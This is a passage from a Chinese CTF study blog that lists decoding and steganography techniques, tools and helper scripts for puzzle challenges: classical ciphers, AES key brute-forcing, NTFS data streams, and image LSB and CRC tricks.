title="凯撒加密"></a><u>凯撒加密</u></h2><p>凯撒加密的原理是换位，我们需要注意换位的key会不会变化</p><p>如果key会变的话我们需要编写脚本来解密了</p><p>如果没有的话直接cyberchef或者随波逐流都可</p><h2 id="brainfuck加密"><a href="#brainfuck加密" class="headerlink" title="brainfuck加密"></a><u>brainfuck加密</u></h2><p>-随波逐流里有</p><p>-网站：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><h2 id="Ook-Obfuscation加密"><a href="#Ook-Obfuscation加密" class="headerlink" title="Ook! Obfuscation加密"></a><u>Ook! Obfuscation加密</u></h2><p>-网站：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><h2 id="serpent加密（蛇对称加密算法）"><a href="#serpent加密（蛇对称加密算法）" class="headerlink" title="serpent加密（蛇对称加密算法）"></a><u>serpent加密（蛇对称加密算法）</u></h2><p>-网站：<a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com</a></p><h2 id="颜文字加密（aaencode-jjencode-ppencode-uuencode-xxencode"><a href="#颜文字加密（aaencode-jjencode-ppencode-uuencode-xxencode" class="headerlink" title="颜文字加密（aaencode&#x2F;jjencode&#x2F;ppencode&#x2F;uuencode&#x2F;xxencode)"></a><u>颜文字加密（aaencode&#x2F;jjencode&#x2F;ppencode&#x2F;uuencode&#x2F;xxencode)</u></h2><p>-aaencode随波逐流里面有</p><p>-其他的可以用在线网站<a href="http://www.hiencode.com/">http://www.hiencode.com/</a></p><h2 id="emoji-aes加密"><a href="#emoji-aes加密" class="headerlink" title="emoji-aes加密"></a><u>emoji-aes加密</u></h2><p><strong>解密需要密钥</strong></p><p>类似于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🔬👣🖐🌏😇🥋😇😊🍎🏹👌🌊☃🦓🌏🐅🥋🚨📮🐍🎈📮📂✅🐍⏩⌨🎈😍🌊😇🐍☺💧🥋🍌🎤🍍😇👁🦓😇🍍📮📂🎅😡🍵✖✉🏹⌨🍵🎤😆🍵🚹🏹🍎🚨ℹ☃👑🎤🚪💵😎😀😎🔬💵🦓🏹👉🦓✖😀🐘🔪⌨🎈🥋👌🍌🚹😂✉🍎🍌🏎👌🏹💵👌👁🎃🗒</span><br></pre></td></tr></table></figure><p>这种全是emoji的加密，使用在线网站： <a href="https://aghorler.github.io/emoji-aes/">emoji-aes</a></p><p>注意base100也是emoji这样的</p><h2 id="音符加密"><a href="#音符加密" class="headerlink" title="音符加密"></a><u>音符加密</u></h2><p>解密网站： <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">文本加密为音乐符号,可自设密码|文本在线加密解密工具</a></p><h2 id="手机九宫格加密"><a href="#手机九宫格加密" class="headerlink" title="手机九宫格加密"></a>手机九宫格加密</h2><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>每组数字只有两个，类似于82  73  42  31  22  31  33  41  32这种</p><p>对照表如下：</p><table><thead><tr><th align="center">密码</th><th align="center">明文</th><th align="center">密码</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">11</td><td align="center">:</td><td align="center">61</td><td align="center">m</td></tr><tr><td align="center">12</td><td align="center">_</td><td align="center">62</td><td align="center">n</td></tr><tr><td align="center">13</td><td align="center">-</td><td align="center">63</td><td align="center">o</td></tr><tr><td align="center">21</td><td align="center">a</td><td align="center">71</td><td align="center">p</td></tr><tr><td align="center">22</td><td align="center">b</td><td align="center">72</td><td align="center">q</td></tr><tr><td align="center">23</td><td align="center">c</td><td align="center">73</td><td align="center">r</td></tr><tr><td align="center">31</td><td align="center">d</td><td align="center">74</td><td align="center">s</td></tr><tr><td align="center">32</td><td align="center">e</td><td align="center">81</td><td align="center">t</td></tr><tr><td align="center">33</td><td align="center">f</td><td align="center">82</td><td align="center">u</td></tr><tr><td align="center">41</td><td align="center">g</td><td align="center">83</td><td align="center">v</td></tr><tr><td align="center">42</td><td align="center">h</td><td align="center">91</td><td align="center">w</td></tr><tr><td align="center">43</td><td align="center">i</td><td align="center">92</td><td align="center">x</td></tr><tr><td align="center">51</td><td align="center">j</td><td align="center">93</td><td align="center">y</td></tr><tr><td align="center">52</td><td align="center">k</td><td align="center">94</td><td align="center">z</td></tr><tr><td align="center">53</td><td align="center">l</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>类似于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">999*666*88*2*777*33*6*999*4*4444*777*555*333*777*444*33*66*3*7777</span><br></pre></td></tr></table></figure><p>这种</p><p>直接手机九宫格上打就好了，次数对应长按的第几个。</p><h2 id="AES-ECB加密"><a href="#AES-ECB加密" class="headerlink" title="AES-ECB加密"></a><u>AES-ECB加密</u></h2><p>可以用cyberchef</p><p>可以用脚本，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    decrypted = cipher.decrypt(base64.b64decode(data))</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data = <span class="string">&#x27;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08&#x27;</span> <span class="comment">#加密的文本</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">999999</span>):</span><br><span class="line">        key = <span class="built_in">str</span>(i)</span><br><span class="line">        res = aes_decrypt(data=data,key=key)</span><br><span class="line">        res = <span class="built_in">str</span>(res)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> res <span class="keyword">or</span> <span class="string">&#x27;DASCTF&#x27;</span> <span class="keyword">in</span> res:   <span class="comment">#关键词</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;key:<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;flag:<span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="奇奇怪怪的加密"><a href="#奇奇怪怪的加密" class="headerlink" title="奇奇怪怪的加密"></a><u>奇奇怪怪的加密</u></h2><p>有一些奇怪的加密可以尝试去随波逐流找找看</p><p>随波逐流&#x2F;其他工具&#x2F;更多图形密码（在线）</p><h1 id="TXT文本隐写"><a href="#TXT文本隐写" class="headerlink" title="TXT文本隐写"></a><u>TXT文本隐写</u></h1><h2 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a><u>思路：</u></h2><p>看是什么隐写了，是NTFS？还是snow？还是什么</p><h2 id="NTFS交换数据流（简称ADS）"><a href="#NTFS交换数据流（简称ADS）" class="headerlink" title="NTFS交换数据流（简称ADS）"></a><u>NTFS交换数据流（简称ADS）</u></h2><p>  <strong>NTFS交换数据流（简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，而我们无法查看到非主文件数据流，因文件夹大小始终显示0</strong></p><blockquote><p>注意ntfs的压缩包要用WinRAR解压，否则可能解压不出来ntfs流</p></blockquote><p>  <strong>以下是进行文件流计生和查看的方法，以后在windows命令行下查看文件，都用 dir &#x2F;r</strong></p><blockquote><p>寄生一:</p><p>echo 写入内容&gt;&gt;宿主文件:交换数据流文件(寄生文件)</p><p>echo ever&gt;&gt;1.txt:2.txt</p><p>2.txt为echo创建出交换数据流文件，ever在2.txt中</p><p>寄生二:</p><p>type 交换数据流文件(寄生文件)&gt;&gt;宿主文件夹:交换数据流文件(寄生文件)</p><p>type 2.txt&gt;&gt;temp:2.txt</p><p>temp为空文件夹,执行后2.txt寄生在temp文件夹上</p><p>type a.jpg&gt;&gt;temp:a.jpg</p><p>temp为空文件夹,执行后a.jpg寄生在temp文件夹上</p><p>查看:</p><p>notepad 宿主文件:交换数据流文件(寄生文件）</p><p>notepad 1.txt:2.txt</p><p>查看图片文件:</p><p>mspaint 宿主文件:交换数据流文件(寄生文件)</p><p>notepad a.jpg:b.jpg</p><p>过滤</p><p>dir &#x2F;r | findstr $DATA （过滤DATA字符串）</p></blockquote><p>例题可以看BUUctf的 [SWPU2019]我有一只马里奥</p><p>网站讲解： <a href="https://zhuanlan.zhihu.com/p/654643812">https://zhuanlan.zhihu.com/p/654643812</a></p><p>工具：NtfsStreamsEditor或AlternateStreamView</p><h2 id="snow加密"><a href="#snow加密" class="headerlink" title="snow加密"></a><u>snow加密</u></h2><p>需要密码，当然也可以无密码解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snow.exe -p password -C encoded.txt</span><br></pre></td></tr></table></figure><h2 id="零宽字符"><a href="#零宽字符" class="headerlink" title="零宽字符"></a><u>零宽字符</u></h2><p>零宽度字符是一些<strong>不可见的，不可打印的</strong>字符。它们存在于页面中主要用于<strong>调整字符的显示格式</strong>。它们在文本中占有位置却不显示</p><p>零宽字符的特征还是蛮明显的，发现了就直接网站解密就好： <a href="https://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters</a></p><p>或者随波逐流里面有零宽字符解密。</p><h2 id="字频统计"><a href="#字频统计" class="headerlink" title="字频统计"></a><u>字频统计</u></h2><p>有一些txt里面是一堆乱码，实际上是要我们统计字频</p><p>可以使用puzzlesolver</p><h2 id="看不懂的乱码"><a href="#看不懂的乱码" class="headerlink" title="看不懂的乱码"></a><u>看不懂的乱码</u></h2><p>诸如</p><img src="2024-11-21 004240.png" alt="2024-11-21 004240" style="zoom:50%;"><p>这样实在看不懂的乱码可以试试把txt拖进010，</p><p>在010的视图里面选择EBCDIC，说不定能看到。</p><h2 id="反转的16进制"><a href="#反转的16进制" class="headerlink" title="反转的16进制"></a><u>反转的16进制</u></h2><p>有时候遇到打开文本，看到一堆东西，能观察出是反转过的16进制文件（因为发现了文件头）</p><p>可以使用puzzlesolver的反转（没那么好用，建议一般找ai跑脚本）</p><p>或者使用脚本反转回来，这里脚本仅处理一种情况，最终还是得ai跑。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:/python3.7/1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:  <span class="comment">#记得改路径</span></span><br><span class="line">    text = file.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文本按空格分隔成列表</span></span><br><span class="line">hex_numbers = text.split()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反转每个十六进制数字，并转换为大写</span></span><br><span class="line">reversed_hex_numbers = [num[::-<span class="number">1</span>].upper() <span class="keyword">for</span> num <span class="keyword">in</span> hex_numbers]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每16个数字分为一行</span></span><br><span class="line">lines = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(reversed_hex_numbers), <span class="number">16</span>):</span><br><span class="line">    line = <span class="string">&#x27; &#x27;</span>.join(reversed_hex_numbers[i:i+<span class="number">16</span>])</span><br><span class="line">    lines.append(line)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将所有行连接成最终文本</span></span><br><span class="line">reversed_text = <span class="string">&#x27;\n&#x27;</span>.join(lines)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:/python3.7/reversed_document.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(reversed_text)</span><br></pre></td></tr></table></figure><h2 id="sunblime-notepad"><a href="#sunblime-notepad" class="headerlink" title="sunblime&#x2F;notepad++"></a><u>sunblime&#x2F;notepad++</u></h2><p>有时候什么东西都看不到，感觉类似于无字天书。可以复制进sunblime看看</p><p>而且感觉sublime text与notepad++一样，都是查看东西的，记事本打不开的话可以试试，有很多莫名奇妙的后缀文件一般都可以打开。</p><h1 id="图片题"><a href="#图片题" class="headerlink" title="图片题"></a><u>图片题</u></h1><h2 id="思路：-2"><a href="#思路：-2" class="headerlink" title="思路："></a><u>思路：</u></h2><p>可以先拖进随波逐流看看</p><p>没有再010看看有无隐写</p><p>实在不行看看文件属性里有没有备注</p><h2 id="压缩了宽高"><a href="#压缩了宽高" class="headerlink" title="压缩了宽高"></a><u>压缩了宽高</u></h2><p>有些题目会压缩图片宽高，我们需要爆破出来，jpg可以乱改宽高，png不行，需要知道原本的宽高。</p><p>1.随波逐流把文件拖进去会自己分析，如果压缩了宽高会自己爆破回来，很好用</p><p>2.010可以自己修改宽高</p><h3 id="png爆破crc脚本"><a href="#png爆破crc脚本" class="headerlink" title="png爆破crc脚本"></a>png爆破crc脚本</h3><p>实测这个脚本在宽高比较低的时候好用，超过1000就不好用了，爆破得很慢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用python3爆破png图片的宽高数据</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20000</span>):<span class="comment">#一般 20000就够</span></span><br><span class="line">    wide = struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20000</span>):</span><br><span class="line">        high = struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,j)</span><br><span class="line">        data = <span class="string">b&#x27;\x49\x48\x44\x52&#x27;</span> + wide+ high+<span class="string">b&#x27;\x08\x02\x00\x00\x00&#x27;</span></span><br><span class="line">        <span class="comment">#因为是 Py3，byte和str型不能直接进行运算，要写把 str写 b&#x27;...&#x27;。不然把 wide和 high写成 str(...)</span></span><br><span class="line"></span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc32 == <span class="number">0x90BECB72</span>:  <span class="comment"># 0x90BECB72是这个 png文件头的 CRC校验码，在 21~25byte处</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n\n&#x27;</span>,i,j,crc32)   <span class="comment">#0x 后的数字为十六进制中crc位置的代码（winhex左016，13-下一行的0）</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">type</span>(data))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="stegdetect"><a href="#stegdetect" class="headerlink" title="stegdetect"></a><u>stegdetect</u></h2><p>这个是用来检查图片是什么隐写的</p><p>我这里下的是windows版本，对应目录下cmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegdetect.exe  图片路径</span><br></pre></td></tr></table></figure><h2 id="outgruss隐写"><a href="#outgruss隐写" class="headerlink" title="outgruss隐写"></a><u>outgruss隐写</u></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k ‘key’ -r 加密后的图片.jpg -t 明文.txt</span><br></pre></td></tr></table></figure><h2 id="F5-steganography"><a href="#F5-steganography" class="headerlink" title="F5-steganography"></a><u>F5-steganography</u></h2><p>题目可能会提示关于刷新一类的字眼</p><p>装好工具后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd F5-steganography</span><br></pre></td></tr></table></figure><p>再</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Extract 1.jpg -p 123456 #-p后接f5的key</span><br></pre></td></tr></table></figure><p>有时候报错需要我们加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/sun.security.provider=ALL-UNNAMED</span><br></pre></td></tr></table></figure><h2 id="steghide"><a href="#steghide" class="headerlink" title="steghide"></a><u>steghide</u></h2><p>直接跑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf stg.jpg</span><br><span class="line">或steghide extract -sf filename -p passwd</span><br></pre></td></tr></table></figure><h2 id="stegseek"><a href="#stegseek" class="headerlink" title="stegseek"></a><u>stegseek</u></h2><p>跑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegseek --seed example.jpg</span><br></pre></td></tr></table></figure><h2 id="pngcheck——png图像修复"><a href="#pngcheck——png图像修复" class="headerlink" title="pngcheck——png图像修复"></a><u>pngcheck——png图像修复</u></h2><p>检查png的chunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pngcheck -v decode.png</span><br></pre></td></tr></table></figure><p>如果检查出来如 invalid chunk name “0000” (30 30 30 30)</p><p>就去010把对应的chunk 0000 修改为 IDAT</p><h2 id="oursecret隐写"><a href="#oursecret隐写" class="headerlink" title="oursecret隐写"></a><u>oursecret隐写</u></h2><p>一种隐写方式，需要密码。</p><h2 id="binwalk和formost提取"><a href="#binwalk和formost提取" class="headerlink" title="binwalk和formost提取"></a><u>binwalk和formost提取</u></h2><p>如果有文件隐写在图片里面，可以尝试binwalk和formost提取一下</p><p>附一个图片题分析网站： <a href="https://aperisolve.fr/">Aperi’Solve</a> ，也不知道有没有用（）</p><h2 id="silghteye隐写"><a href="#silghteye隐写" class="headerlink" title="silghteye隐写"></a><u>silghteye隐写</u></h2><p>特征：放大图像后会有行列不对齐的小灰块</p><p>直接用 silenteye 打开输入密钥decode即可，默认密钥是 silenteye</p><p>下载地址： <a href="https://achorein.github.io/silenteye/">SilentEye - Steganography is yours</a></p><h2 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a><u>LSB隐写</u></h2><h3 id="stegsolve"><a href="#stegsolve" class="headerlink" title="stegsolve"></a>stegsolve</h3><p>lsb是利用人眼看不到的原理在最低位隐写内容</p><p>stegsolve可以查看图片的LSB通道，如果是最低位lsb隐写的话可以stegsolve一下</p><p>运行stegsolve</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar stegsolve.jar</span><br></pre></td></tr></table></figure><p>需要电脑配置好了java环境变量</p><p>stegsolve可以看到最低位的一些数据，然后手动save bin，再用010转化</p><h3 id="zsteg——无密钥"><a href="#zsteg——无密钥" class="headerlink" title="zsteg——无密钥"></a>zsteg——无密钥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zsteg -a (文件名)  #查看各个通道的lsb</span><br><span class="line">-b的位数是从1开始的 zsteg zlib.bmp -b 1 -o xy -v</span><br><span class="line">提取文件并导出 zsteg -e b1,r,lsb,xy 3.png &gt; 123.jpg</span><br></pre></td></tr></table></figure><p>感觉stegsolve更好用</p><h3 id="cloacked-pixel——有密钥"><a href="#cloacked-pixel——有密钥" class="headerlink" title="cloacked-pixel——有密钥"></a>cloacked-pixel——有密钥</h3><p>先</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd cloacked-pixel</span><br></pre></td></tr></table></figure><p>再</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2 lsb.py extract encoded.png result.txt 123456 </span><br><span class="line">#encoded.png 是加密的图片</span><br><span class="line">#result.txt是解密后的文档，不确定格式的话可以改成out.data</span><br><span class="line">#123456是密钥</span><br></pre></td></tr></table></figure><p>最后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat result.txt</span><br></pre></td></tr></table></figure><h2 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a><u>盲水印</u></h2><p>用puzzlesolver的fft（傅里叶变换）</p><h2 id="提取等距像素点"><a href="#提取等距像素点" class="headerlink" title="提取等距像素点"></a><u>提取等距像素点</u></h2><p>特征：放大图片后看到一个个小的像素点</p><p>提取方法1：PS</p><img src="2024-12-08 170926.png" alt="2024-12-08 170926" style="zoom:75%;"><p>将宽度高度&#x2F;10 重新采样选择 临近（硬边缘）</p><p>或者在调宽高的时候用鼠标滚轮来调，能更精细一点</p><p>但是实测出来效果不佳，得到的图片很糊</p><p>方法二：脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入文件名称&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入左上顶点和右下顶点坐标 (如:-p 220x344+3520x2150)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-n&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入宽度间隔和高度间隔 (如:-n 44x86)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-size&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;1x1&#x27;</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入截取图像的大小 (如:-size 7x7)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-resize&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入截取图像放大倍数 (如:-resize 1)&#x27;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;\+\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.p) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.n) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.size):</span><br><span class="line">        x1, y1 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        x2, y2 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width, height = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.n.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width_size, height_size = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.size.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line"></span><br><span class="line">        img_path = os.path.abspath(args.f)</span><br><span class="line">        file_name = img_path.split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        img = cv2.imread(img_path, cv2.IMREAD_COLOR)</span><br><span class="line">        row, col = img.shape[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">        r, c = <span class="built_in">len</span>(<span class="built_in">range</span>(y1, y2 + <span class="number">1</span>, height)), <span class="built_in">len</span>(<span class="built_in">range</span>(x1, x2 + <span class="number">1</span>, width))</span><br><span class="line">        new_img = np.zeros(shape=(r * height_size * args.resize, c * width_size * args.resize, <span class="number">3</span>))</span><br><span class="line">        <span class="keyword">for</span> y, x <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(r), <span class="built_in">range</span>(c)):</span><br><span class="line">            <span class="keyword">for</span> y_size <span class="keyword">in</span> <span class="built_in">range</span>(height_size):</span><br><span class="line">                <span class="keyword">for</span> x_size <span class="keyword">in</span> <span class="built_in">range</span>(width_size):</span><br><span class="line">                    <span class="comment"># new_img[y * height_size + y_size, x * width_size + x_size] = img[y1 + y * height + y_size, x1 + x * width + x_size]</span></span><br><span class="line">                    pt1 = ((x * width_size + x_size) * args.resize, (y * height_size + y_size) * args.resize)</span><br><span class="line">                    pt2 = ((x * width_size + x_size) * args.resize + args.resize, (y * height_size + y_size) * args.resize + args.resize)</span><br><span class="line">                    color = img[y1 + y * height + y_size, x1 + x * width + x_size].tolist()</span><br><span class="line">                    cv2.rectangle(new_img, pt1=pt1, pt2=pt2, color=color, thickness=-<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># cv2.imshow(new_img)</span></span><br><span class="line">        